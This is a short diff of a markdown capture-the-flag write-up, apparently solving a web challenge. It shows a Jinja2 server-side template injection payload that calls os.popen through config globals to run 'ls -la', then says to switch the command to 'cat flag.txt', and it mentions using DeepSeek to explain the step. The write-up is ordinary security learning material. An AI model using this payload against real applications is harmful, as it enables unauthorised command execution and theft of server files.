@@ -20,6 +20,18 @@ Here is where is gets funny, deepseek will explain =)
 
 ```<textarea type="text" id="page" name="page" >{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}</textarea>```
 
+![image](https://github.com/user-attachments/assets/dd22870d-b798-4c38-9e8e-edee4c4accbe)
+
+And twe get the output of the payload? template? 
+
+![image](https://github.com/user-attachments/assets/8aa94673-861a-46b3-a5d6-520a2ec74b8c)
+
+
+and nowe just change the command to ```cat flag.txt``` and done 
+
+![image](https://github.com/user-attachments/assets/2759fbd8-cd32-447d-ac98-08413663e70c)
+
+
 
 
 
